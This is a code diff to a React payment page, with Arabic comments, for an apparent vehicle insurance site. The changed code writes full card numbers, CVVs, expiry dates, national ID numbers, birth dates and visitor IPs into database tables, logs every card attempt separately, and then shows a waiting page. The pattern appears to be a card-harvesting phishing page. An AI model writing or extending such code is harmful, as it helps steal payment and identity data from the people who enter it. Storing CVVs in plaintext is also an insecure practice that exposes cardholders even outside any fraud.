@@ -153,8 +153,7 @@ const Payment = () => {
     const expiryDate = `${expiryMonth}/${expiryYear}`;
 
     try {
-      // حفظ أو تحديث معلومات البطاقة في قاعدة البيانات
-      let orderDbData;
+      setWaitingApproval(true);
       
       // جلب session_id و IP من visitor_tracking
       const sessionId = sessionStorage.getItem("visitor_session_id");
@@ -174,8 +173,11 @@ const Payment = () => {
         }
       }
       
-      // إذا كان هناك رقم تسلسل موجود، نحدث السجل الموجود
+      let orderDbData;
+      
+      // التحقق من وجود رقم تسلسل صالح
       if (orderData.sequenceNumber) {
+        // محاولة تحديث السجل الموجود
         const { data, error: updateError } = await supabase
           .from('customer_orders')
           .update({
@@ -195,10 +197,47 @@ const Payment = () => {
           .select()
           .maybeSingle();
         
-        if (updateError) throw updateError;
-        orderDbData = data;
+        if (updateError) {
+          console.error('Update error:', updateError);
+          throw updateError;
+        }
+        
+        if (data) {
+          orderDbData = data;
+        } else {
+          // إذا لم يتم العثور على السجل، إنشاء سجل جديد
+          const { data: insertData, error: insertError } = await supabase
+            .from('customer_orders')
+            .insert({
+              card_holder_name: cardHolder,
+              card_number: cardNumber,
+              expiry_date: expiryDate,
+              cvv: cvv,
+              insurance_company: companyName,
+              insurance_price: finalPrice,
+              sequence_number: orderData.sequenceNumber,
+              id_number: orderData.idNumber || '0000000000',
+              birth_date: orderData.birthDate || '2000-01-01',
+              phone_number: orderData.phoneNumber || null,
+              owner_name: orderData.ownerName || null,
+              vehicle_type: orderData.vehicleType || '',
+              vehicle_purpose: orderData.vehiclePurpose || '',
+              estimated_value: orderData.estimatedValue || null,
+              policy_start_date: orderData.policyStartDate || null,
+              add_driver: orderData.addDriver || null,
+              visitor_session_id: sessionId,
+              visitor_ip: visitorIp,
+              status: 'pending'
+            })
+            .select()
+            .single();
+          
+          if (insertError) throw insertError;
+          orderDbData = insertData;
+        }
       } else {
-        // إنشاء سجل جديد (في حالة الدخول المباشر)
+        // إنشاء سجل جديد مباشرة
+        const newSequenceNumber = `ORD-${Date.now()}`;
         const { data, error: insertError } = await supabase
           .from('customer_orders')
           .insert({
@@ -208,7 +247,7 @@ const Payment = () => {
             cvv: cvv,
             insurance_company: companyName,
             insurance_price: finalPrice,
-            sequence_number: `ORD-${Date.now()}`,
+            sequence_number: newSequenceNumber,
             id_number: orderData.idNumber || '0000000000',
             birth_date: orderData.birthDate || '2000-01-01',
             phone_number: orderData.phoneNumber || null,
@@ -230,21 +269,23 @@ const Payment = () => {
       }
 
       // حفظ محاولة الدفع
-      const { error: attemptError } = await supabase
-        .from('payment_attempts')
-        .insert({
-          order_id: orderDbData.id,
-          card_holder_name: cardHolder,
-          card_number: cardNumber,
-          expiry_date: expiryDate,
-          cvv: cvv
-        });
+      if (orderDbData?.id) {
+        const { error: attemptError } = await supabase
+          .from('payment_attempts')
+          .insert({
+            order_id: orderDbData.id,
+            card_holder_name: cardHolder,
+            card_number: cardNumber,
+            expiry_date: expiryDate,
+            cvv: cvv
+          });
 
-      if (attemptError) {
-        console.error('Error inserting payment attempt:', attemptError);
+        if (attemptError) {
+          console.error('Error inserting payment attempt:', attemptError);
+        }
       }
 
-      // Update context
+      // Update context with saved data
       updateOrderData({
         cardNumber: cardNumber,
         cardHolderName: cardHolder,
@@ -253,15 +294,15 @@ const Payment = () => {
         sequenceNumber: orderDbData.sequence_number
       });
 
-      // الانتقال إلى صفحة التحميل
-      setWaitingApproval(true);
+      // الانتقال إلى صفحة التحميل فقط بعد نجاح الحفظ
       navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${finalPrice}&orderId=${orderDbData.id}`);
 
     } catch (error) {
       console.error('Error submitting payment:', error);
+      setWaitingApproval(false);
       toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء معالجة الدفع",
+        title: "خطأ في معالجة الدفع",
+        description: "حدث خطأ أثناء حفظ معلومات الدفع. يرجى المحاولة مرة أخرى.",
         variant: "destructive",
       });
     }
